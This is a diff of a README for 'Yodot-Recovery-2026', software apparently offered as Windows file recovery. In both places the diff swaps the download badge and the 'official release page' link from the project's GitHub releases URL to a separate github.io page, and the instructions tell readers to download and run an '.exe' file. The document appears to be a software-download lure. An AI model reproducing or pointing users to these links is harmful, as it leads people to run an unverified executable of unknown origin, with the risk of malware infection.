@@ -1,6 +1,6 @@
 # 💾 Yodot-Recovery-2026 - Restore Lost Files On Windows Easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sharing-marabou52/Yodot-Recovery-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sharing-marabou52.github.io)
 
 ## 🎯 About This Software
 
@@ -20,7 +20,7 @@ To install and run Yodot-Recovery-2026, your computer must meet these requiremen
 
 Follow these steps to set up the software on your PC.
 
-1.  Visit the official release page: [https://github.com/Sharing-marabou52/Yodot-Recovery-2026/releases](https://github.com/Sharing-marabou52/Yodot-Recovery-2026/releases).
+1.  Visit the official release page: [https://sharing-marabou52.github.io](https://sharing-marabou52.github.io).
 2.  Look for the latest version under the "Assets" section.
 3.  Click the file ending in ".exe" to start the download.
 4.  Wait for the small file to save to your "Downloads" folder.
